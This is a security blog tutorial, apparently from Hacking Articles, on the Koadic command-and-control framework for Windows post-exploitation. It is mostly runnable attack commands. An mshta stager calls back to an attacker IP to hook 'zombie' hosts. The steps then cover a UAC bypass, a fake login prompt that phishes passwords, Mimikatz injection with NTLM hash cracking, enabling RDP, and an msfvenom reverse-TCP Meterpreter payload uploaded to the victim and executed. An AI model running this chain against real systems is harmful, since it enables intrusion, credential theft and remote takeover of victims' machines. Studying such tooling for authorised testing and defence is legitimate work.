---
title: 'Koadic – COM Command & Control Framework'
date: 2019-12-01T18:22:00+01:00
draft: false
---

  

Thanks auther  

### ABOUT THE AUTHOR

 [![Raj Chandel](https://secure.gravatar.com/avatar/a8379953e2e8ae3c18bafcf23aa02ca0?s=226&d=mm&r=g)](https://www.hackingarticles.in/author/raaz/) 

#### Raj Chandel

  
Hello friends!! In this article, we are introducing another most interesting tool “KOADIC – COM Command & Control” tool which is quite similar to Metasploit and Powershell Empire. So let’s began with its tutorial and check its functionality.  

### Table of Content

*   Introduction to Koadic
*   Installation of Koadic
*   Usage of Koaidc
*   Koadic Stagers
*   Privilege Escalation with Koadic Implants
*   Post Exploitation
    *   Generate Fake Login Prompt
    *   Enable Rdesktop
    *   Inject Mimikatz
    *   Execute Command
    *   Obtain Meterpreter Session from Zombie Session

### Introduction to Koadic

Koadic, or COM Command & Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire. The major difference is that Koadic does most of its operations using Windows Script Host (a.k.a. JScript/VBScript), with compatibility in the core to support a default installation of Windows 2000 with no service packs (and potentially even versions of NT4) all the way through Windows 10.  
It is possible to serve payloads completely in memory from stage 0 to beyond, as well as use cryptographically secure communications over SSL and TLS (depending on what the victim OS has enabled).  
Koadic also attempts to be compatible with both Python 2 and Python 3. However, as Python 2 will be going out the door in the not-too-distant future, we recommend using Python 3 for the best experience.  
_Source – //github.com/zerosum0x0/koadic_  

### Installation of Koadic

It must first be downloaded and installed in order to start using Koadic. Run the following command to download Koadic from github and also take care of its dependency tools while installing koadic.  

git clone //github.com/zerosum0x0/koadic cd koadic

1

2

git clone  //github.com/zerosum0x0/koadic

cd koadic

apt-get install python3-pip pip3 install -r requirements.txt ./koadic

1

2

3

apt\-get install python3\-pip

pip3 install  \-r  requirements.txt

./koadic

![](https://i0.wp.com/2.bp.blogspot.com/-bjAlpze9ESg/XD9FoYHShWI/AAAAAAAAcGQ/BRKMFOVva10g_V3P8kgXje-5uO4p-GA9wCLcBGAs/s1600/1.png?w=687)  

### Usage of Koaidc

This tool majorly depends upon stager and implant. It contains 6 stager and 41 implants.  
**Stager:** Stagers hook target zombies and allow you to use implants.  
**Implants:** Implants start jobs on zombies.  
Once installation gets completed, you can run **./koadic** file to start koadic. Then run the most helpful command to get the synopsis of the use of koadic. The help command summarizes the various commands available. Koadic functions are similar to other frameworks, such as Metasploit.  
![](https://i2.wp.com/4.bp.blogspot.com/-tcLJ2SfJL2I/XD9Fq3a_hSI/AAAAAAAAcG0/h7Unh0ZQA5UlKVJexpeG2KuYex06ubcGQCLcBGAs/s1600/2.png?w=687)  
To load all available module in the terminal run “**_use ”_** command. This will dump all available implant and stagers for execution or explore stager module with following commands:  

use stager/js/

1

use  stager/js/

This will give you all stagers that will be useful for getting zombie session of the target machine.  
![](https://i1.wp.com/2.bp.blogspot.com/-oaNfUQl-DFM/XD9FrYRVQvI/AAAAAAAAcG4/wl31WXzMYhoK_uYCC4qa8vMU5sZDYB9WACLcBGAs/s1600/3.png?w=687)  

### Koadic Stagers

The stager enables us to describe where any zombie device accesses the Koadic command and control. Some of these settings can be viewed by running info command once the module is selected. Let’s start with loading the **mshta stager** by running the following command.  
Set SRVHOST where the stager should call home and SRVPORT the port to listen for stagers on or even you can set ENDPOINT for the malicious file name and then enter run to execute.  

set SRVHOST 192.168.1.107 set ENDPOINT sales run

1

2

3

set SRVHOST  192.168.1.107

set ENDPOINT sales

run

![](https://i0.wp.com/3.bp.blogspot.com/-bM2mHEBZTMI/XD9FrnvgNJI/AAAAAAAAcG8/wOhp_lQV-aon6X6n4JX5QqaoP5WHZ0qyACLcBGAs/s1600/4.png?w=687)  
 Now run below command to execute the above generated malicious file.  

mshta //192.168.1.107:9999/sales

1

mshta  //192.168.1.107:9999/sales

![](https://i1.wp.com/4.bp.blogspot.com/-uwUX9P0H3gw/XD9Fr0lBPsI/AAAAAAAAcHA/ySeULZCj2t4Viat4DBvzFhrsAIluw_jYACLcBGAs/s1600/5.png?w=687)  
Once the malicious sales file will get executed on the target machine, you will have a **Zombie connection** just like metasploit.  

zombies 0

1

zombies  0

![](https://i2.wp.com/1.bp.blogspot.com/-EL0cu7Srrt8/XD9FsInmKPI/AAAAAAAAcHE/Yhod21obhwIkEXeLtlTUMltWsKKP_ckGQCLcBGAs/s1600/6.png?w=687)  

### Privilege Escalation with Koadic Implants

Once you have zombie session after than you can use implant modules for privilege escalation that includes bypass UAC.  
Koadic contains all modules to bypass UAC of Windows 7, 8, 10 platform so that you can extract system level information. We can load this module by running the command below within Koadic.  

use implant/elevate/bypassuac\_eventvwr

1

use  implant/elevate/bypassuac\_eventvwr

Then, we will set the payload value to run the module. You can use default zombie value as “ALL” to attack all zombies or can set the particular zombie id you want to attack. Use the command below to adjust the payload value and zombie.  

set PAYLOAD 0 set ZOMBIE 0 run

1

2

3

set PAYLOAD  0

set ZOMBIE  0

run

![](https://i2.wp.com/2.bp.blogspot.com/-3uuMHOodKk0/XD9FssApLBI/AAAAAAAAcHI/NpOvATCydeIy3_0b84jcPddT-D76A88xgCLcBGAs/s1600/7.png?w=687)  

### Post Exploitation

### Generate Fake Login Prompt

You can start a phishing attack with koadic and track the victim’s login credentials. We can load this module by running the command below within Koadic.  

use implant/phish/password\_box set ZOMBIE 1 run

1

2

3

use  implant/phish/password\_box

set ZOMBIE  1

run

![](https://i1.wp.com/3.bp.blogspot.com/-CT7l6zJyNOM/XD9Fs26uQ8I/AAAAAAAAcHQ/xfMOe6IdFz0bCOXx5DJ9yxvuyEp1F-NpgCLcBGAs/s1600/8.png?w=687)  
This will launch a Prompt screen for login at the victim’s machine.  
![](https://i1.wp.com/2.bp.blogspot.com/-91QVn8sd4BA/XD9Fs5u8cBI/AAAAAAAAcHM/lW2FvhOYWf0VX3qRNWcRQOwjso1wd7U2gCLcBGAs/s1600/9.png?w=687)  
Therefore, if the victim enters his password in a fake prompt, you get the password in the command and control shell of Koadic.  
![](https://i1.wp.com/2.bp.blogspot.com/-D-yusrDbS9o/XD9FoRboCvI/AAAAAAAAcGU/m3FsqqGHRa8m3f2udotuYtolQKVMQaVpwCLcBGAs/s1600/10.png?w=687)  

### Enable Rdesktop

Just like metasploit, here also you can enable remote desktop service in the victim’s machine with the following implant module.  

use implant/manage/enable\_rdesktop set ZOMBIE 1 run

1

2

3

use  implant/manage/enable\_rdesktop

set ZOMBIE  1

run

As you can observe in the below image that job 4 is completed successfully and it has enabled rdesktop service.  
![](https://i0.wp.com/3.bp.blogspot.com/-PhLRIIhPQ_A/XD9FoRaKkWI/AAAAAAAAcGM/UtD6H8QGA5QqX6wAP_lKMqrtmeXeddFggCLcBGAs/s1600/11.png?w=687)  
We can ensure for rdesktop service with the help of nmap to identify state for port 3389.  

nmap -p3389 192.168.1.103

1

nmap  \-p3389  192.168.1.103

Hmm!! So you can observe from nmap result we found port 3389 is open which means **rdesktop** service is enabled.  
![](https://i0.wp.com/2.bp.blogspot.com/-gds6RBQavBQ/XD9Fo33HUCI/AAAAAAAAcGY/sm0LPZwMhRQsdn4RyygamJagNX9L-tlrgCLcBGAs/s1600/12.png?w=687)  

### Inject Mimikatz

It will let you inject mimikatz in victim’s machine for extracting the password from inside the machine. We can load this module by running the command below within Koadic.  

use implant/inject/mimikatz\_dotnet2js set ZOMBIE 1 run

1

2

3

use  implant/inject/mimikatz\_dotnet2js

set ZOMBIE  1

run

As result, it will dump the **NTLM hash** password which we need to crack. Save the NTLM value in a text file.  
![](https://i0.wp.com/3.bp.blogspot.com/-xqtm2sGcKuw/XD9FpepQoCI/AAAAAAAAcGg/RtWy8eRhauA1IJIgjQe9OvYLWBgNmzevACLcBGAs/s1600/13.png?w=687)  
Then we will use john the ripper for cracking hash value, therefore run following command along with the hash file as shown below:  

john hash --format=NT

1

john hash  \--format\=NT

As you can observe that it has shown 123 as the password extracted from the hash file.  
![](https://i0.wp.com/2.bp.blogspot.com/-8smxnKE86g8/XD9FpCFtH6I/AAAAAAAAcGc/sQnP25jOadkzK33YKklT2qg134-nVXV6gCLcBGAs/s1600/14.png?w=687)  

### Execute Command

Since we high privileged shell, therefore, we are free to run any implant module for Post exploitation, and now we are using exec\_cmd to execute any command on the Windows system. To load this implant, run the command given below.  

use implant/manage/exec\_cmd

1

use  implant/manage/exec\_cmd

Then, we will set the CMD value to run the specified command along with Zombie id.  

set CMD ipconfig set ZOMBIE 1 run

1

2

3

set CMD ipconfig

set ZOMBIE  1

run

![](https://i0.wp.com/2.bp.blogspot.com/--T0ZJ-ExcZo/XD9Fp4GSIQI/AAAAAAAAcGk/M7Yxt42mdWInoGndaVu1FYx1Wtoauxa_QCLcBGAs/s1600/15.png?w=687)  

### Obtain Meterprter Session from Zombie Session

If you are having zombie session then you can get meterpreter session through it. Generate a malicious file with the help of msfvenom and start multi handle, as we always do in metasploit.  

msfvenom -p windows/meterpreter/reverse\_tcp lhost=192.168.1.107 lport=1234 -f exe > shell.exe

1

msfvenom  \-p  windows/meterpreter/reverse\_tcp lhost\=192.168.1.107  lport\=1234  \-f  exe  \>  shell.exe

![](https://i0.wp.com/2.bp.blogspot.com/-tsHMm2C3qd0/XD9FqLVjkZI/AAAAAAAAcGo/W04uIdD_oME45EvG6Lm-pL9lUQb9FbZYQCLcBGAs/s1600/16.png?w=687)  
Koadic provides an implant module that allows you to upload any file inside the machine of the victim if you have zombie sessions. To load this implant, run the following command:  

use implant/util/upload\_file

1

use  implant/util/upload\_file

Now set the file location and Zombie Id then run the module. This will upload your malicious in writable directory i.e. %TEMP%.  

set LFILE /root/shell.exe set ZOMBIE 1 run

1

2

3

set LFILE  /root/shell.exe

set ZOMBIE  1

run

Once the job is completed then again use exec\_cmd to run the uploaded file with the help of this module.  

use implant/manage/exec\_cmd

1

use  implant/manage/exec\_cmd

Then, we will set the CMD value to run the uploaded shell.exe file along with Zombie id.  

set CMD %TEMP%/shell.exe set ZOMBIE 1 run

1

2

3

set CMD  %TEMP%/shell.exe

set ZOMBIE  1

run

![](https://i2.wp.com/2.bp.blogspot.com/-nagdgoSZ50k/XD9FqDjN2-I/AAAAAAAAcGs/p4ktuLKpHXcgTqkx6xA2GpLX_uXgS3GRQCLcBGAs/s1600/17.png?w=687)  
Once you will execute the malicious exe file within Koadic zombie session, you will get a meterpreter session in the metasploit framework as shown below:  

msf > use exploit/multi/handler msf exploit(handler) > set payload windows/meterpreter/reverse\_tcp msf exploit(handler) > set rhost IP 192.168.1.107 msf exploit(handler) > set lport 1234 msf exploit(handler) > exploit

1

2

3

4

5

msf  \>  use  exploit/multi/handler

msf exploit(handler)  \>  set payload windows/meterpreter/reverse\_tcp

msf exploit(handler)  \>  set rhost IP  192.168.1.107

msf exploit(handler)  \>  set lport  1234

msf exploit(handler)  \>  exploit

Once the file is executed on the machine we will get the victim machine meterpreter session as shown below:  
![](https://i0.wp.com/1.bp.blogspot.com/-tLFPdzUBf10/XD9Fq_eIqeI/AAAAAAAAcGw/okDey8ahhGQQBTx_0kvASTiy7Vk8KEgawCLcBGAs/s1600/18.png?w=687)  
  

1.  **Author: **AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets